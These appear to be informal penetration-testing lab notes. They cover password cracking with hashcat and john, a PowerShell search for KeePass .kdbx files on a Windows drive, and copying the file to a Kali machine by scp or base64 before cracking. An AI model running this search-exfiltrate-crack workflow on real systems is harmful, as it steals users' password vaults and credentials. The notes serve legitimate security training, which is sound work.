```

use hashcat if john don't work

#Q I just hope we don't have to make rules for hashcat to crack

ls -la /usr/share/hashcat/rules/
few rules are provided

This rule will add 1@3$5 after each password in rockyou


hash-identifier tool

# password manager

#searchfileinwindows

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

**This will search #kdbx file from windows**

then get kdbx file to Kali

### few ways to transfer

#### SCP way

How To Transfer Database.kdbx to your Kali machine. I got you. 

First, enable ssh on your Kali machine: 

└─$ sudo service ssh start 

Then Easily from an RDP connection (Windows Machine): 

C:\Users\jason\Documents> scp Database.kdbx kali@192.168.45.155:/home/kali/Desktop

**(Haven't worked for me while doing exercise)****

#### GOLD BASE64!

run in windows from where we want to transfer

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Users\ASUS\Desktop\test.py" -Encoding byte))
<random_string_generated>
```

get that string which generated by above command

```bash
echo paste_that_random_string_generated" | base64 -d > test.py
```

##### check integrity

to check file hash in linux
```bash
md5sum file.txt 
```
to verify that hash

```powershell
Get-FileHash C:\Users\ASUS\Desktop\test.txt -Algorithm md5
```


#### smbserver

start server in kali
